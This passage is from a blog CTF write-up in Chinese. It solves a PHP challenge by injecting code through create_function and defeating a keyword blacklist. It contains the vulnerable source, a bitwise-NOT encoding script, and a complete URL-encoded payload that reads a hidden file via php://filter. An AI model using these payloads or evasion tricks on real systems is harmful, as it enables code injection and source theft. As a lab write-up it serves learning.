+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( sha1(<span class="variable">$shana</span>) === sha1(<span class="variable">$passwd</span>) &amp;&amp; <span class="variable">$shana</span> != <span class="variable">$passwd</span> )&#123;</span><br><span class="line">    extract(<span class="variable">$_GET</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="variable">$code</span>) || </span><br><span class="line">preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="variable">$arg</span>) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$code</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的$code我们可以控制其为<code>create_function</code>函数，而$arg也是我们可以控制的(通过对flag数组赋值)。这样我们就可以进行注入了。<br>因为包含了<code>flag.php</code>文件所以我们猜测存在<code>$flag</code>变量。<br>我们使用<code>get_defined_vars()</code>函数来达到获取所有的变量键值对。但是发现是个假flag，且提示我们flag在rea1fl4g.php中，那么我们想办法包含这个文件，因为<code>include</code>被禁了，所以我们使用<code>require</code>。我们尝试使用<code>require()</code>来包含rea1fl4g.php ，然后进行读取所有变量，但是还是没有发现到flag。（只有一个假的）。<br>此时，我们猜测需要读取到rea1fl4g.php文件内容，想到php伪协议读取。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span>(php:<span class="comment">//filter/read=convert.base64-encode/resource=rea1fl4g.php)</span></span><br></pre></td></tr></table></figure>
+
+<p>但是<code>$arg</code>中过滤了蛮多关键字。这是我们想到了取反。先是打算用python写一个脚本但是没成（求大佬指点），后面对照用php写了一个：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;p h p : / / f i l t e r / r e a d = c o n v e r t . b a s e 6 4 - e n c o d e / r e s o u r c e = r e a f l 4 g . p h p&quot;</span>;</span><br><span class="line"><span class="variable">$arr1</span> = explode(<span class="string">&#x27; &#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;~(&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arr1</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;%&quot;</span>.bin2hex(~<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;)&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这里可用preg回溯代替</p>
+<p>最后得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f))</span><br></pre></td></tr></table></figure>
+
+<p>那现在我们的payload为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">get:</span><br><span class="line">?%<span class="number">64</span>%<span class="number">65</span>%<span class="number">62</span>%<span class="number">75</span>=%<span class="number">61</span>%<span class="number">71</span>%<span class="number">75</span>%<span class="number">61</span>%<span class="number">5</span>f%<span class="number">69</span>%<span class="number">73</span>%<span class="number">5</span>f%<span class="number">63</span>%<span class="number">75</span>%<span class="number">74</span>%<span class="number">65</span>%<span class="number">0</span>a&amp;%<span class="number">66</span>%<span class="number">69</span>%<span class="number">6</span>c%<span class="number">65</span>=%<span class="number">64</span>%<span class="number">61</span>%<span class="number">74</span>%<span class="number">61</span>%<span class="number">3</span>a%<span class="number">2</span>c%<span class="number">64</span>%<span class="number">65</span>%<span class="number">62</span>%<span class="number">75</span>%<span class="number">5</span>f%<span class="number">64</span>%<span class="number">65</span>%<span class="number">62</span>%<span class="number">75</span>%<span class="number">5</span>f%<span class="number">61</span>%<span class="number">71</span>%<span class="number">75</span>%<span class="number">61</span>&amp;%<span class="number">73</span>%<span class="number">68</span>%<span class="number">61</span>%<span class="number">6</span>e%<span class="number">61</span>[]=<span class="number">1</span>&amp;%<span class="number">70</span>%<span class="number">61</span>%<span class="number">73</span>%<span class="number">73</span>%<span class="number">77</span>%<span class="number">64</span>[]=<span class="number">2</span>&amp;%<span class="number">66</span>%<span class="number">6</span>c%<span class="number">61</span>%<span class="number">67</span>%<span class="number">5</span>b%<span class="number">61</span>%<span class="number">72</span>%<span class="number">67</span>%<span class="number">5</span>d=&#125;<span class="keyword">require</span>(~(%<span class="number">8</span>f%<span class="number">97</span>%<span class="number">8</span>f%c5%d0%d0%<span class="number">99</span>%<span class="number">96</span>%<span class="number">93</span>%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">8</span>d%d0%<span class="number">8</span>d%<span class="number">9</span>a%<span class="number">9</span>e%<span class="number">9</span>b%c2%<span class="number">9</span>c%<span class="number">90</span>%<span class="number">91</span>%<span class="number">89</span>%<span class="number">9</span>a%<span class="number">8</span>d%<span class="number">8</span>b%d1%<span class="number">9</span>d%<span class="number">9</span>e%<span class="number">8</span>c%<span class="number">9</span>a%c9%cb%d2%<span class="number">9</span>a%<span class="number">91</span>%<span class="number">9</span>c%<span class="number">90</span>%<span class="number">9</span>b%<span class="number">9</span>a%d0%<span class="number">8</span>d%<span class="number">9</span>a%<span class="number">8</span>c%<span class="number">90</span>%<span class="number">8</span>a%<span class="number">8</span>d%<span class="number">9</span>c%<span class="number">9</span>a%c2%<span class="number">8</span>d%<span class="number">9</span>a%<span class="number">9</span>e%ce%<span class="number">99</span>%<span class="number">93</span>%cb%<span class="number">98</span>%d1%<span class="number">8</span>f%<span class="number">97</span>%<span class="number">8</span>f));<span class="comment">//&amp;%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6</span></span><br><span class="line">没urlencode前:</span><br><span class="line">debu=aqua_is_cute%<span class="number">0</span>a&amp;file=data:,debu_debu_aqua&amp;shana[]=<span class="number">1</span>&amp;passwd[]=<span class="number">2</span>&amp;flag[arg%<span class="number">5</span>d=&#125;<span class="keyword">require</span>(~(%<span class="number">8</span>f%<span class="number">97</span>%<span class="number">8</span>f%c5%d0%d0%<span class="number">99</span>%<span class="number">96</span>%<span class="number">93</span>%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">8</span>d%d0%<span class="number">8</span>d%<span class="number">9</span>a%<span class="number">9</span>e%<span class="number">9</span>b%c2%<span class="number">9</span>c%<span class="number">90</span>%<span class="number">91</span>%<span class="number">89</span>%<span class="number">9</span>a%<span class="number">8</span>d%<span class="number">8</span>b%d1%<span class="number">9</span>d%<span class="number">9</span>e%<span class="number">8</span>c%<span class="number">9</span>a%c9%cb%d2%<span class="number">9</span>a%<span class="number">91</span>%<span class="number">9</span>c%<span class="number">90</span>%<span class="number">9</span>b%<span class="number">9</span>a%d0%<span class="number">8</span>d%<span class="number">9</span>a%<span class="number">8</span>c%<span class="number">90</span>%<span class="number">8</span>a%<span class="number">8</span>d%<span class="number">9</span>c%<span class="number">9</span>a%c2%<span class="number">8</span>d%<span class="number">9</span>a%<span class="number">9</span>e%ce%<span class="number">99</span>%<span class="number">93</span>%cb%<span class="number">98</span>%d1%<span class="number">8</span>f%<span class="number">97</span>%<span class="number">8</span>f));<span class="comment">//&amp;flag[code]=create_functio%6e</span></span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">debu=&amp;file=</span><br></pre></td></tr></table></figure>
+
+<p>最后发现源码长这样，怪不得输出变量没flag:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="line">&lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Real_Flag In Here!!!&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;鍜︼紝浣犲眳鐒舵壘鍒版垜浜嗭紵锛佷笉杩囩湅鍒拌繖鍙ヨ瘽涔熶笉浠ｈ〃浣犲氨鑳芥嬁鍒癴lag鍝︼紒&quot;</span>;</span><br><span class="line">	<span class="variable">$f4ke_flag</span> = <span class="string">&quot;BJD&#123;1am_a_fake_f41111g23333&#125;&quot;</span>;</span><br><span class="line">	<span class="variable">$rea1_f1114g</span> = <span class="string">&quot;flag&#123;274cbb44-e5dc-4338-b4c6-b4918cba2f45&#125;&quot;</span>;</span><br><span class="line">	<span class="keyword">unset</span>(<span class="variable">$rea1_f1114g</span>);</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    <div class="about">
+        <h1>About this Post</h1>
+        <p>This post is written by John Doe, licensed under <a
+                target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+    </div>
+
+    
+        
+    
+</article>
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h4 class="title">Blog</h4>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/projects" class="item">Projects</a>
+                
+                <a href="/resume" class="item">Resume</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h4 class="title">Projects</h4>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h4 class="title">Me</h4>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2021 John Doe<br >Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></span>
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+    </body>
+</html>
